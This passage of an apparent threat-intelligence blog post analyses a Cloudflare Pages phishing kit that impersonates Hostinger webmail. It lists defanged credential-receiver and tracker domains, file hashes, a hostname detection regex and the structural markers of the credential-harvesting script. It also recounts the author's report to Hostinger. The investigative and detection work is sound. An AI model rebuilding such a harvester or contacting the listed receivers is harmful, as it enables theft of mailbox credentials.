1. **Bare root redirect, high confidence.** The root itself returned HTTP 200 with no redirect header. The captured <code>js.js</code> expects valid <code>coztrexx</code> and <code>trexxcoz</code> values and contains the navigation to legitimate Hostinger Mail when the reconstructed mailbox is invalid. <code>js1.js</code> has a separate fallback when <code>trexxx</code> is absent. A direct root visit without the intended lure parameters is therefore expected to leave the clone.
2. **Unknown path remains, plausible but not fully proven.** The HTML loads <code>jg.js</code>, <code>js1.js</code>, and <code>js.js</code> through relative paths. The server returned the same HTML at both <code>/admin</code> and <code>/admin/</code>. From a slash-terminated URL, those script names resolve below <code>/admin/</code> an SPA fallback can then return HTML where the browser expected JavaScript. With <code>X-Content-Type-Options: nosniff</code>, that response should not run as a script, so the redirect logic may never start. The exact address after browser normalization, console output, asset requests, cache state, and MIME decisions were not retained, so a HAR is required to turn this explanation into a finding.
3. **Platform enforcement is real but does not explain this pair of results.** Two other bounded hosts served Cloudflare's <code>Suspected Phishing</code> interstitial and one returned 522. That can explain a warning or unavailable host, not the explicit navigation to legitimate Hostinger encoded in the exact-content sample.

There is **no retained evidence of Evilginx** in this case. The preserved implementation is a static Pages clone with client-side POST destinations. No reverse-proxy traffic, session-cookie relay, upstream Hostinger session, MFA relay, or Evilginx lure identifier was observed. The query values are evidenced as mailbox personalization and a separate tracking token calling them Evilginx lure IDs would turn a theory into a fact without doing the inconvenient evidence part. There is also no evidence that the operator identified the analyst or deliberately blocked the VM. A changed deployment, cache or browser-profile difference remains possible, but weaker than the behavior already present in the captured code.

### Five ZIP names, five hosts, and zero ZIP archives

After the first validation, a separate hash-gated archive-candidate run was performed. Each of the five hosts first had to serve the exact root-document SHA-256 again. Only then were five fixed basenames requested from each host: <code>kit.zip</code>, <code>hostinger.zip</code>, <code>mail.zip</code>, <code>backup.zip</code>, and <code>files.zip</code>.

| Control | Value |
| --- | --- |
| UTC time | 2026-08-24 17:48:15 to 17:53:38 |
| Hosts | Five exact-content Pages names |
| Requests | Five root gates and 25 archive candidates, 30 GET requests in total |
| Concurrency | 1, with a 10-second pause |
| Redirects | Disabled |
| Candidate result | 25 HTTP 200 responses, <code>text/html</code>, 186,751 bytes, failed ZIP structure |
| Valid archives retained | 0 |

This is a **negative archive-recovery result**. It establishes that no valid ZIP was returned under those five names, on those five hosts, during that five-minute and 23-second window. It does not establish that an archive never existed under another name, at another time, or in another project.

Cloudflare documents that a Pages project without a top-level <code>404.html</code> can behave as a single-page application and serve the root document for unknown paths. The same status, content type, and size are consistent with that fallback rather than five mysterious archives that all decided to become HTML. Candidate body hashes were not retained, so this article does not claim that all 25 responses were byte-identical. They were same-sized HTML responses and none was a valid ZIP.

## Existing projects were updated in place

Three of the five current exact-match hosts had earlier retained root hashes:

| Historical hostname suffix | Historical scan | Earlier root hash | 2026-08-24 root hash | Assessment |
| --- | --- | --- | --- | --- |
| <code>rytcytajlrzfhyfzwajxbeqp</code> | 2026-05-01 | <code>b5e7a6aa...fd2d6</code> | <code>728d235b...f50af5</code> | Replaced with the latest document |
| <code>flddahmxjzeyekhvpqblfdvn</code> | 2026-06-01 | <code>b5e7a6aa...fd2d6</code> | <code>728d235b...f50af5</code> | Replaced with the latest document |
| <code>ucvdyqggkgehxwxmggwfxxga</code> | 2026-07-02 | <code>b5e7a6aa...fd2d6</code> | <code>728d235b...f50af5</code> | Replaced with the latest document |

This shows that the workflow was not simply "create, use, forget". At least some existing projects were updated in place while new randomized names continued to appear.

For defenders, that has two consequences:

1. taking down one URL does not remove the deployment method
2. a known historical host cannot be treated as immutable because its body can change.

## DNS: 298 names resolved, but that is not 298 active phishing pages

After two documented resolver retries, all 298 exact known Pages names returned public A records. The results contained 596 A responses, 206 unique IP addresses, and a TTL of 300 seconds.

The observed addresses belonged to shared Cloudflare space:

| Observed /24 | A responses |
| --- | ---: |
| <code>172.66.44.0/24</code> | 135 |
| <code>172.66.45.0/24</code> | 20 |
| <code>172.66.46.0/24</code> | 20 |
| <code>172.66.47.0/24</code> | 135 |
| <code>188.114.96.0/24</code> | 143 |
| <code>188.114.97.0/24</code> | 143 |

These are Cloudflare edge addresses, not an attacker origin or operator geography. Blocking all of AS13335 because of this finding would be like bricking up every door in a city because of one bad tenant. Dramatic, but not especially intelligent.

More importantly, all 298 names resolved while the eight-host HTTP sample included the exact kit, an interstitial, and an error. A DNS answer tells us that a name receives an address, not what content it currently serves.

## TLS and certificate-transparency boundaries

All eight TLS handshakes completed with TLS 1.3. Each leaf certificate contained the exact project name and a wildcard beneath that project:

~~~text
<project>.pages.dev
*.<project>.pages.dev
~~~

Three leaf certificates were issued through Google Trust Services WE1, three through Let's Encrypt YE2, and two through Let's Encrypt YE1. The CA differences are consistent with platform-managed issuance and rotation. They are not an operator fingerprint.

Exact-name certificate-transparency searches for the eight hosts returned 34 rows and 30 unique unexpired certificates. The unauthenticated public Cert Spotter endpoint used for this step exposes unexpired issuance rather than a complete historical archive. Thirty is therefore a lower bound for the current view, not the campaign's lifetime certificate count.

In five historical samples, certificate <code>validFrom</code> times preceded URLScan submission by about 73 to 172 minutes. This is consistent with rapid project provisioning, but submitters may themselves monitor new certificates. The interval cannot be turned into a delivery time or a first-victim timestamp.

## Two infrastructure functions

The architecture separates roles clearly:

~~~text
personalized lure URL
        |
        v
randomized Cloudflare Pages project
        |
        +-> cloned Hostinger login HTML
        +-> stable credential harvester
        +-> tracker module
        +-> generic anti-inspection
        |
        +-> username/password POST to credential Render service
        +-> tracker-token POST to another Render service
        |
        v
fake errors and redirect to legitimate Hostinger Mail
~~~

Cloudflare Pages served the static lure and kit files. The Render subdomains named in the code performed credential-collection and tracking functions. The service providers are infrastructure intermediaries, not attributed operators.

On 2026-08-24, public DNS for all three Render names followed the same shared platform chain:

~~~text
gcp-us-west1-1.origin.onrender.com
gcp-us-west1-1.origin.onrender.com.cdn.cloudflare.net
216.24.57.15
216.24.57.7
~~~

This confirms that the names resolved through shared Render and Cloudflare infrastructure. It does not establish that a particular application was awake, accepted POST requests, retained data, or remained under the same account's control. That would require provider telemetry or deliberate direct probing, which the controlled collectors excluded. The later VM observation retained no HAR, so an automatic tracker request during that page load cannot be ruled in or out.

## Partial platform enforcement

Seventy historical URLScan observations ended at a Cloudflare suspected-phishing interstitial. Two of the eight hosts checked on 2026-08-24 also served such a warning.

That is a real mitigation signal, but not a complete takedown view:

- a warning may have been enabled for only part of the project set
- an interstitial at scan time does not say when it appeared
- DNS can continue to resolve
- another project using the same kit can appear minutes later
- five hosts from the same sample still served exact malicious content.

An effective abuse report therefore needs more than a URL list. It needs a cluster package containing hostname grammar, script and document hashes, first-seen and last-seen times, Render roles, and a request for the provider to pivot through internal account and deployment data.

## Broader kit lineage

The Hostinger core is the strongest indicator in this cluster, but parts of the implementation grammar also appear in other lures.

The retained data repeatedly contains:

- <code>trexxx</code>
- <code>trexxcoz</code>
- <code>coztrexx</code>
- <code>wfIUbh</code>
- path marker <code>QOIUEWFHWYREFNFE2Pdf</code>.

In the first narrow pivot package for which detailed URLScan results were retained, deduplicated by URLScan UUID:

| Parameter combination | Unique retained scans |
| --- | ---: |
| All four parameters without the long path | 19 |
| All four parameters with the long path | 5 |
| Long path only | 3 |
| <code>trexxx</code> and <code>trexxcoz</code> | 1 |

These 25 records span January 2024 to August 2026 and use Cloudflare Pages task domains. Final themes include Microsoft or spreadsheet, Adobe or PDF, generic secure-file, and other login lures.

An important boundary is that none of these 25 records overlapped the locally retained exact Hostinger core, current tracker, legacy tracker, or long Hostinger hostname pivot. Five overlapped only the generic anti-inspection hash.

The shared parameters therefore support a shared kit convention or builder-lineage hypothesis. They do not justify joining every cross-brand page into one campaign and giving it one attractive actor name.

### Hostinger-labelled names do not all carry the same evidential weight

Across all local pivots, Pages names containing a Hostinger label fell into several evidence tiers:

| Tier | Names | What the evidence shows |
| --- | ---: | --- |
| Confirmed main family | 299 | The 298 exact task-query names plus one same-prefix final-page name fixed <code>ewgjnwrkgnkrw</code>, a 24-letter suffix, and Hostinger-core context |
| Confirmed core precursor | 1 | <code>hostinger-uumivqkwcvvexhetvgxogfai[.]pages[.]dev</code>, with the exact credential-harvester hash from 2025-12-23, before the long March 2026 naming form |
| Weak context lead | 1 | <code>hostinger-update-ngainmpncpsketwbolthzknx[.]pages[.]dev</code>, linked only through the generic anti-inspection hash and a Hostinger title |
| Grammar-only lead | 1 | <code>hostinger-wwckxewfyujojngbkjxdudnf[.]pages[.]dev</code>, sharing broader path and parameter grammar but not the exact Hostinger core its final title was <code>wtbbusiness</code> |

The local evidence therefore contains 301 Hostinger-labelled **task domains**. Of these, 298 belong to the exact long family. Adding one same-pattern name seen only in a final-page role gives a complete family union of 299. These figures cannot be compressed into a convenient claim of "302 Hostinger campaign domains". Two weak leads are not confirmed family members.

A redirect chain from 2026-05-09 also contains <code>hostingermailhrbgwnejfknewh[.]pythonanywhere[.]com</code> before a Pages-hosted Hostinger page. This is delivery or redirect-infrastructure context, not another output from the Pages project-name generator.

The [complete defanged domain inventory](/assets/data/hostinger-pages-phishing-2026/hostinger-domain-inventory.csv) publishes all 302 Hostinger-labelled Pages names across task and final-page roles, plus that one PythonAnywhere redirect-context name. Each row preserves its role and evidence tier, so the two leads are not silently promoted into confirmed campaign infrastructure. Full URLs, paths, query strings and private scan identifiers are not included.

### Sixty-seven cross-brand task domains with the same 24-letter shape

The partial broader-grammar collection contained 99 saved Search API response files and 366 deduplicated scan IDs. Within them, 67 unique Pages **task domains** matched the more general form:

~~~text
<lure prefix>-<24 lowercase a-z letters>.pages.dev
~~~

| Prefix | Unique task domains |
| --- | ---: |
| <code>update</code> | 19 |
| <code>adobe</code> | 11 |
| <code>excel</code> | 10 |
| <code>kdsieghrehbgherk</code> | 6 |
| <code>navieghrehbgherk</code> | 4 |
| <code>navietkoreeark</code> | 4 |
| <code>viewfile</code> | 4 |
| <code>sso-godaddy</code> | 4 |
| <code>pdf</code> | 2 |
| <code>dhl</code> | 1 |
| <code>hostinger</code> | 1 |
| <code>naver</code> | 1 |

All 67 suffixes were unique. Their entropy was 4.6892 of a maximum 4.7004 bits per character, and the chi-square statistic against a uniform distribution was 24.79. No suffix was reused across prefixes and none matched the 298 suffixes from the main Hostinger query.

This shape is a meaningful signal that a shared naming convention or compatible builder output exists in the broader ecosystem. No generator source code was recovered, so a single common function is not proven. The set was already selected through shared parameter and path grammar and is not a neutral sample of all Pages projects. It cannot be used to estimate what fraction of all phishing uses this format. The internet already has enough percentages whose denominator went out for lunch.

### Path markers changed while the grammar remained

The completed <code>task.url:"trexxcoz"</code> set contained 118 scan IDs and at least 15 sanitized task-path variants. A narrower reproducible hostname-analysis extractor retained seven single-segment alphanumeric markers between 10 and 64 characters it deliberately excludes other path forms. The most frequent marker, <code>QOIUEWFHWYREFNFE2Pdf</code>, appeared in 62 records from 2024-10-03 to 2026-07-14. It crossed <code>update</code>, <code>adobe</code>, <code>excel</code>, <code>pdf</code>, <code>viewfile</code>, and one context-only <code>hostinger</code> prefix.

Other variants are consistent with changing builder grammar, but could also result from several copied template versions:

| Path marker | Observations in this set | Themes or hosting context |
| --- | ---: | --- |
| <code>HEDBWFRHKJEBRHJBVOLDpd</code> | 8 | Earlier 2024 lures |
| <code>DEWFHRGBKIFNVJDGNoffi</code> | 14 | <code>excel</code>, <code>update</code>, <code>viewfile</code>, and IPFS |
| <code>UOJFREIGTJGBRDLKFMFDyah</code> | 6 | 2024-12 to 2025-02 |
| <code>GWEOJIGJHUWRGNJFDiddy</code> and lowercase variant | 4 + 1 | Uppercase form across <code>adobe</code> and <code>update</code> lowercase form through <code>dhl</code> |
| <code>peugjherkjgrgvfdchoti</code> | 2 | Rarer variant |

This strengthens the reusable-builder, kit-convention, or service hypothesis. The exact Hostinger credential-harvester hash was not found under other brands in this partial local set. Exact current and legacy tracker-hash results also remained Hostinger-associated. The cross-brand relationship rests on naming shape, path markers, parameter grammar, and one more broadly reused legacy endpoint, not a byte-identical Hostinger core.

## Public context predating the Hostinger hostname family

The same four-parameter grammar and long path appear earlier in public sources:

- a retained URLScan public observation from 2025-07-24 shows an Excel/PDF theme, the same path and parameters, and a Render request
- a retained URLScan public observation from 2025-09-16 shows a short-link, Koyeb, Render, and Google final chain using the same grammar.

The two direct result pages are not linked because their public scan metadata contains potentially recipient-derived values. A generic URLScan homepage link would not substantiate either observation, so only the dates and publication-safe analytical context are retained here.

This extends the publicly verifiable context for the full path and parameter grammar back to at least July 2025. The broader metadata acquisition described below tracks individual markers and their overlaps separately, so its earlier dates do not mean every record contained the entire same kit. Third-party verdicts are context here, not the primary proof of malicious behavior.

One public redirect-chain result contains a <code>000webhostapp.com</code> host. The string <code>000webhostapp</code> does not appear in any local Hostinger body or derived file. That host cannot be treated as part of the current Hostinger kit merely because it appeared in an external historical chain.

### Partial acquisition for the broader lineage

Additional URLScan public Search API metadata was queried in monthly intervals from 2023-01-01 through 2026-08-24. No private API key was used. No campaign host was opened by this particular public metadata collection. The run stopped after persistent HTTP 429 responses rather than increasing request pressure.

The retained state is explicitly marked **partial**:

| Pivot | Coverage | Unique scan IDs | Status |
| --- | --- | ---: | --- |
| Distinctive path | 44 of 44 monthly intervals | 226 | Complete for this query and time window |
| Task URL parameter | 44 of 44 | 118 | Complete for this query and time window |
| Final-page parameter | 10 of 44, through 2023-10-31 | 46 | Partial |
| Deployment stem | 0 of 44 | 0 | Not started |
| Legacy resource domain | 0 of 44 | 0 | Not started |

The union of the three collected sets contains 366 deduplicated scan IDs. The distinctive-path and task-parameter sets overlap on 23 scan IDs. This is the strongest signal in that acquisition because the same unusual path and task-URL grammar coincide in specific public scans.

Counts from pivots with different coverage cannot be compared directly. The 46 partial page-parameter results are not a "smaller campaign", and the 226 path results are not victims. They are products of different URLScan fields, coverage, and submitter behavior.

A publication-safe hosting aggregate contains matching records across Cloudflare Pages, older Replit hosting, PythonAnywhere, Koyeb, an IPFS gateway, GitHub Pages, and Firebase Hosting. This multi-platform view supports a reusable-framework or builder-lineage hypothesis, but does not establish provider compromise, one account, or one operator.

The broader acquisition does not change the narrower Hostinger finding's evidence boundary.

## Legacy tracker endpoint: a real link with weak attribution value

The legacy tracker endpoint appeared in 58 URLScan observations across 35 task domains from 2024-01-11 to 2026-08-02. Lure themes were:

| Theme | Observations |
| --- | ---: |
| Microsoft, Excel, or spreadsheet | 19 |
| Generic secure-file or sign-in | 15 |
| Adobe or PDF | 12 |
| Other or untitled | 11 |
| Hostinger | 1 |

Task infrastructure includes Pages, PythonAnywhere, Koyeb, Surge, and URL shorteners.

This is genuine infrastructure or convention reuse. A single backend name across several brands could, however, represent:

- one operator
- one kit developer and several customers
- phishing as a service
- a resold or copied package
- a shared tracking service
- simply long-lived reused code.

Public data cannot reliably choose among these explanations. This article therefore uses "kit lineage" and "deployment family", not actor attribution.

## Link strength: what is strong and what is only context

| Level | Relationship | Assessment |
| --- | --- | --- |
| Exact | Core SHA-256 across 467 observations | Byte-identical credential and redirect logic strongest family IOC |
| Exact | Latest document SHA-256 | High-precision indicator for a specific version |
| Exact | Current tracker SHA-256 across 452 observations | Byte-identical current tracker version |
| Strong | Normalized structure of legacy and current trackers | Functionally equivalent module with a changed endpoint |
| Strong | Seven stable resources in six complete samples | Reused UI and script bundle |
| Medium | Current tracker domain or hash with Hostinger context | Useful only alongside stronger signals |
| Weak | Legacy tracker endpoint alone | Cross-brand and cross-platform reuse, not operator proof |
| Generic | Anti-inspection hash | Commodity behavior never use alone |

This is the central analytical distinction in the investigation. **Byte-identical code is strong evidence of code lineage. It is not automatically strong evidence of human attribution.**

## Alternative hypotheses

To avoid turning the analysis into a story where every similar hostname belongs to one supervillain, four hypotheses remain in scope.

### H1: one operator and one deployment pipeline

The uniform 24-letter names, stable exact core, tracker-version transition, in-place updates, and shared Hostinger UI bundle support this hypothesis.

### H2: one kit developer and several deployers

A byte-identical bundle could be sold, shared, or operated as a service. Every customer could receive the same randomized naming function.

### H3: a copied kit retaining shared infrastructure

Operators could copy the package with hardcoded Render endpoints and parameters intact. Backend reuse would then not imply common control.

### H4: several modules from a broader builder

The cross-brand parameter grammar, tracker endpoint, and generic anti-inspection code could be components of one broader builder, with the Hostinger core representing a separate theme.

The narrow family of 298 task-query names and 299 names in the cross-pivot union is well explained by a uniform deployment model and versioned package. That alone cannot choose H1 over H2 or H3 because all three can generate the same public artifacts. H4 remains a serious alternative for the broader cross-brand view. Provider account telemetry could distinguish these hypotheses much more effectively.

## ATT&CK mapping without turning it into a bingo card

ATT&CK mappings should describe what the data shows. They should not become a ritual where every impressive-sounding technique is selected.

| Technique | Status | Evidence-based explanation |
| --- | --- | --- |
| [T1608.005, Stage Capabilities: Link Target](https://attack.mitre.org/techniques/T1608/005/) | Observed | Archived HTML and JavaScript form a cloned login target intended to collect credentials. |
| [T1056.003, Input Capture: Web Portal Capture](https://attack.mitre.org/techniques/T1056/003/) | Observed | The code reads email and password fields and prepares their transfer from a fake portal. |
| [T1583.006, Acquire Infrastructure: Web Services](https://attack.mitre.org/techniques/T1583/006/) | Consistent with | Cloudflare Pages and Render services were used, but it is unknown whether accounts were registered, compromised, rented, or shared. |
| [T1598.003, Phishing for Information: Spearphishing Link](https://attack.mitre.org/techniques/T1598/003/) | Not directly observed | The page is designed for credential phishing, but no original delivery message or email was retained. |

T1566.002 and T1204.001 are not directly observed because the dataset contains neither the primary delivery artifact nor a user-execution event. Successful exfiltration is also not assigned. The code shows intent and destination, but neither a victim POST nor a receiver receipt was observed.

## IOC quality tiers

### Tier 1: high precision

| Type | Value | Use boundary |
| --- | --- | --- |
| Hostname regex | <code>^hostinger-mail-ewgjnwrkgnkrw-[a-z]{24}\.pages\.dev$</code> | Strong indicator for the observed deployment family |
| Root document SHA-256 | <code>728d235b2ad22aa3e0f9147f267256d06b80e5ebd7bd61daa1499c1ab6f50af5</code> | High precision but version-specific |
| Credential script SHA-256 | <code>9805613dfd2c4b09e3080d0fabbfb8476efff9cd57775481df5a523922b311c2</code> | Strongest behavioral indicator in the retained set |
| Credential receiver | <code>mohamedbinsalm[.]onrender[.]com</code> | Explicit credential POST destination in the code no form was submitted and this receiver was not contacted |

### Tier 2: use with context

| Type | Value | Use boundary |
| --- | --- | --- |
| Current tracker SHA-256 | <code>563824f1917c8b2be9d54cc5b3c5dbcfd1b8cc9198039a3f54fe705d08ee6d5d</code> | Useful with Hostinger or form context |
| Current tracker domain | <code>moyin-psp-12012026[.]onrender[.]com</code> | Tracking role, not credential receiver |
| Parameters | <code>trexxx</code>, <code>trexxcoz</code>, <code>coztrexx</code> | Broader cross-brand grammar insufficient individually |
| Stable UI bundle | Five CSS hashes and the exact core | Useful for static-content clustering |

### Tier 3: weak or generic

| Type | Value | Why it is weak |
| --- | --- | --- |
| Legacy tracker domain | <code>wfrgbfchkp[.]onrender[.]com</code> | Appears across many brands and platforms |
| Legacy tracker SHA-256 | <code>b4f03187184e98f148b8fce890a35849a41f86aff938965138bf8a2346cf7d10</code> | Older version use only with context |
| Anti-inspection SHA-256 | <code>9201f2ee02b6b642504b09f95e61a57a2bcff43e23c7d737473229e2e4f7d503</code> | 5,079 URLScan observations across many different lures |
| AS13335 or <code>pages.dev</code> | Shared platform | Far too broad and guaranteed to create false positives |
| <code>onrender.com</code> | Shared platform | Render hosts many legitimate services |

A complete machine-readable version is available as the [defanged Hostinger domain inventory](/assets/data/hostinger-pages-phishing-2026/hostinger-domain-inventory.csv). Hashes, receiver and tracker domains, aggregate findings, and methodological boundaries remain in the [public research bundle](/assets/data/hostinger-pages-phishing-2026/README.md).

## Detection and hunting ideas

### DNS and proxy telemetry

The first high-precision candidate is the hostname expression:

~~~regex
^hostinger-mail-ewgjnwrkgnkrw-[a-z]{24}\.pages\.dev$
~~~

When such a host appears in DNS or proxy logs, enrichment should check:

1. whether the HTTP response hash matches the known root document or core script
2. whether the page loads <code>/js.js</code>, <code>/js1.js</code>, and <code>/jg.js</code>
3. whether the request chain includes one of the Render destinations
4. whether navigation from the task origin ends at legitimate Hostinger Mail
5. whether the query contains the parameter names, while retaining their values only under the organization's privacy policy.

Full personalized query strings should not be retained or shared merely to make a detection look richer. A parameter name is often enough, while a decoded mailbox local part can already be personally identifiable information.

### Static-content hunting

The most reliable combination is:

~~~text
hostname regex
AND
(root SHA-256 OR credential-script SHA-256)
~~~

If the hashes change, a structural hunt can combine:

- the Hostinger brand literal
- form IDs <code>rcmloginuser</code> and <code>rcmloginpwd</code>
- the combination of POST fields <code>ai</code>, <code>pr</code>, and <code>pg</code>
- <code>btoa</code> applied to both credential fields
- the same <code>Login failed.</code> string in success and error callbacks
- a redirect to legitimate Hostinger Mail after a counter increment
- one tracker parameter and a Render destination.

A single <code>btoa</code>, password field, or jQuery AJAX call is completely ordinary web behavior. The combination and brand context are what matter.

### Historical URLScan hunting

In URLScan searches, separate:

- <code>task.domain</code>, which identifies the originally submitted campaign host
- <code>page.domain</code>, which can become legitimate after a redirect
- contacted <code>domain</code>, which describes infrastructure reached during the session
- response hashes, which are stronger than a final title
- the scan timestamp, which is one observation rather than registration or delivery time.

Deduplicate results separately by scan UUID and task hostname. Those counts answer different questions.

### A retrospective lead for Hostinger

Current Pages responses carried <code>Referrer-Policy: strict-origin-when-cross-origin</code>, and the kit later navigates to legitimate Hostinger Mail. Depending on browser behavior, privacy controls, and retained Hostinger logs, the legitimate system may have received the phishing origin as a Referer.

Hostinger can check retained webmail ingress logs against the hostname expression. This is a lead, not a victim counter. An absent Referer does not exclude a visit, and a present Referer does not prove a credential submission.

## Provider coordination and publication boundaries

Hostinger was notified privately before publication. The complete defanged domain-only inventory is public. Full URLs, paths, query strings, provider ticket identifiers, private scan identifiers, and potentially personalized URLScan fields remain withheld. The public bundle is intentionally limited to the evidence needed to assess the published conclusions.

### Hostinger notification timeline

**2026-08-24, initial report.** I reported the ongoing Hostinger impersonation, phishing, and credential-harvesting campaign to <code>report-phishing@hostinger.com</code>. I attached the evidence available at the time, so this was more than another "this domain looks suspicious to me" message.

**2026-08-24, first response.** A reply arrived from <code>security@hostinger.com</code>: "thanks for reaching out! at the moment, we do not accept vlunerability [sic] reports via email. However, we do have a bug bounty program in place."

Come on. This was not a vulnerability report, a bug-bounty submission, or an attempt to collect a bounty for one more missing header. The message described an active Hostinger impersonation and credential-harvesting campaign, with attachments. Whether the person replying read the message and its evidence was impossible to determine from the template. If an active phishing report lands in the vulnerability bucket, the process could use basic cybersecurity training, or at least a cyber glossary in which "ongoing phishing campaign" and "vulnerability" appear on different pages.

**2026-08-24, clarification.** I replied again: "Hello once again, this is not bug bounty thing, or vulnerability report", and restated that the report concerned an active Hostinger impersonation and credential-harvesting campaign.

**2026-08-25, second response.** Hostinger replied with "thank you for sharing report" and said it monitors Hostinger impersonation. The response was basic, but at least the correct template had been selected this time. During a follow-up state check on 2026-08-26, some reported domains remained live and several new related names had appeared in the dataset. Takedowns are not one magic button, so that observation alone is not evidence of inaction. Credit where it is due.

Additional credit goes to Aurimas, Hostinger's Head of Cyber Security. One LinkedIn message was enough for him to understand what the report actually concerned and clarify where its category had been lost in the process.

That still leaves me with a broader question. How many independent bug-bounty hunters and security researchers report active abuse, malicious scripts, or credential-harvesting infrastructure, receive zero or template-only feedback, and eventually stop contacting companies before publication? After this exchange, I would think twice before reporting another active impersonation campaign through the same channel. Adform was also provided with the relevant evidence and an explanation of what had been identified, where, and how. There was no response.

The life of an independent security researcher, apparently: do the investigation, package the evidence, explain that phishing is not a vulnerability, and then hope somebody reads past the subject line.

Provider-facing evidence should remain precise and separated by role. Hostinger is the impersonated organization, Cloudflare Pages hosts the static deployments, and the Render names in the archived code serve credential or tracking functions. None of those statements attributes malicious intent to a provider.

For Hostinger, the useful package contains an executive summary, original and annotated screenshots, exact document and core hashes, the complete URL list in a private attachment, the Render roles, and an explicit statement that the evidence does not show a Hostinger compromise. Useful defensive requests include correlation against customer reports and any retained referrer data.

Public URLScan results can expose personalized mailbox fragments through query strings or report titles. Evidence preservation should retain scan UUIDs while avoiding unnecessary republication of recipient identifiers, query tokens, cookies, API keys, or provider ticket secrets.

## What this investigation proves

- Archived code reads login-field values and prepares a POST containing them, while the same kit bytes were confirmed in the bounded current sample.
- Credential and tracking functions are separated into two modules and different Render services.
- The core script and UI bundle were reused consistently across many deployments.
- The current long-hostname-family naming was probably automated.
- At least three surviving Pages projects were updated in place.
- Cloudflare enforcement interrupted part of the family, while the exact kit remained available elsewhere in the bounded sample.
- A broader ecosystem of parameter and endpoint reuse exists across multiple brands.

## What this investigation does not prove

- It does not identify victims, count them, or establish successful credential submissions.
- It does not establish account takeover or financial loss.
- It does not show compromise of Hostinger systems.
- It does not prove that all 298 names were active simultaneously.
- It does not prove that one person or group controlled every deployment.
- It does not identify an operator's country through CDN addresses or a certificate issuer.
- It does not confirm that the Render receivers remain active or retain data.
- It does not show the original phishing message or delivery channel.
- It does not turn a URLScan verdict into truth, or the absence of a verdict into innocence.

## Analytical confidence summary

| Finding | Confidence | Basis |
| --- | --- | --- |
| Credential-harvesting behavior | High | Explicit field reads, Base64, POST construction, fake failures, and redirect in hash-verified code |
| Five sample hosts served the exact kit on 2026-08-24 | High | Exact root and 15 asset-response SHA-256 matches |
| The 24-letter suffix is generated automatically | High | Uniform length, full alphabet, and near-maximum entropy |
| Many separate Pages projects | Medium-high | One-level hostname form and Cloudflare's documented production naming |
| Surviving projects were updated in place | High for three hosts | Same hostname with different historical and current exact root hashes |
| Broader shared-kit or builder lineage | Moderate | Parameter, path, tracker, and anti-inspection reuse across other lures |
| One operator controlled the whole set | Unknown | No account, payment, repository, or source-IP telemetry |

## Conclusion

The investigation began with a handful of strangely named Pages hosts and ended with a fairly clear deployment model:

~~~text
automated project name
  -> copied Hostinger login
  -> stable credential script
  -> separate tracking module
  -> separate Render receivers
  -> fake errors
  -> redirect to a legitimate website
~~~

The domains change at the surface. The code beneath them changes much more slowly. That is why exact hashes, structural flow, and module lineage provide more value than adding 298 separate URLs to a blocklist.

The case is also a useful reminder that CTI must separate three questions:

1. **What does the code do?**
2. **How does the infrastructure repeat?**
3. **Who controls it?**

The first two can be supported strongly in this case. The third requires provider or law-enforcement telemetry. Inventing the third answer from random letters and shared CDN addresses would not be threat intelligence. It would be fan fiction with an IOC table.

The available evidence does not show compromise of Hostinger systems. It shows that Hostinger's identity was used for deception. Cloudflare and Render are not the threat actor. They are platforms on which specific customer deployments performed different campaign functions. URLScan is not victim telemetry. It is a point-in-time observation source.

Those boundaries do not weaken the finding. They make it more reliable.

## Public research artifacts

The sanitized, publication-safe evidence package is available in the [Hostinger Pages phishing research bundle](/assets/data/hostinger-pages-phishing-2026/README.md). Its [complete defanged domain inventory](/assets/data/hostinger-pages-phishing-2026/hostinger-domain-inventory.csv) contains 302 Hostinger-labelled Pages names across roles and one PythonAnywhere redirect-context name, with confirmed domains kept separate from lead-only and contextual records. The bundle also contains hashes, derived hostname statistics, methodology notes, an evidence-file manifest, and evidence-boundary documentation needed to inspect the published conclusions without exposing full task URLs, paths, query strings, mailbox fragments, raw response bodies, API credentials, private scan identifiers, provider ticket data, or local workstation paths.

The original URLScan evidence manifest SHA-256 is:

~~~text
d6be97aa5b5e9356a81c899b8f615cc753383e3b00a0543026b335af3bdb59ad
~~~

The partial broader-lineage evidence manifest SHA-256 is:

~~~text
d1e519a9dd46bc76e9c5447d8066c7e21c93a44035feb38e6d998195620c0119
~~~

The second hash anchors the explicitly partial acquisition state. If remaining intervals are collected later, its hash and every derived broader-lineage count must be versioned rather than silently replaced.

The illustrative hostname-analysis snippet in this article is not recovered operator source code. No command capable of contacting campaign infrastructure is included in the public package.

## Sources

Primary platform, reporting, and analytical references:

1. [Hostinger: How to report a security issue at Hostinger](https://www.hostinger.com/support/8001450-how-to-report-a-security-issue-at-hostinger/)
2. [Hostinger: How to access Hostinger hPanel](https://www.hostinger.com/support/1583518-how-to-access-the-dashboard-in-hostinger/)
3. [Hostinger: Official Hostinger email addresses](https://www.hostinger.com/support/5394387-official-hostinger-email-addresses/)
4. [Hostinger: What to do if you receive a phishing email at Hostinger?](https://www.hostinger.com/support/8344399-what-to-do-if-you-receive-a-phishing-email-at-hostinger/)
5. [Cloudflare: Our approach to abuse](https://www.cloudflare.com/trust-hub/abuse-approach/)
6. [Cloudflare: Reporting abuse](https://www.cloudflare.com/trust-hub/reporting-abuse/)
7. [Cloudflare: Transparency Report, H1 2025](https://cf-assets.www.cloudflare.com/slt3lc6tev37/5DiewkfYlBVgef9zHC00ib/42d5fadccefce6be832b0d7cdfe7d26c/1H_2025_Cloudflare-s_Transparency_Report_Abuse_V3.pdf)
8. [Cloudflare Pages: Preview deployments](https://developers.cloudflare.com/pages/configuration/preview-deployments/)
9. [Cloudflare Pages: Direct Upload](https://developers.cloudflare.com/pages/get-started/direct-upload/)
10. [Render: Security and Trust](https://render.com/security)
11. [Render: Web Services](https://render.com/docs/web-services)
12. [URLScan: Search API Reference](https://docs.urlscan.io/apis/urlscan-openapi/search)
13. [URLScan: Result API Reference](https://urlscan.io/docs/result/)
14. [URLScan: FAQ](https://urlscan.io/docs/faq/)
15. [ODNI: ICD 203 Analytic Standards](https://www.dni.gov/files/documents/ICD/ICD-203.pdf)
16. [Cloudflare Pages: Serving Pages and SPA fallback](https://developers.cloudflare.com/pages/configuration/serving-pages/)
17. [MITRE ATT&CK T1568.002: Dynamic Resolution, Domain Generation Algorithms](https://attack.mitre.org/techniques/T1568/002/)

Two retained URLScan public observations dated 2025-07-24 and 2025-09-16 were used only for implementation-grammar context. Their direct result pages are withheld because the public metadata contains potentially recipient-derived values the URLScan homepage is deliberately not presented as a citation for those records.

Third-party classifications are not used as standalone proof of malicious behavior in the locally examined code.
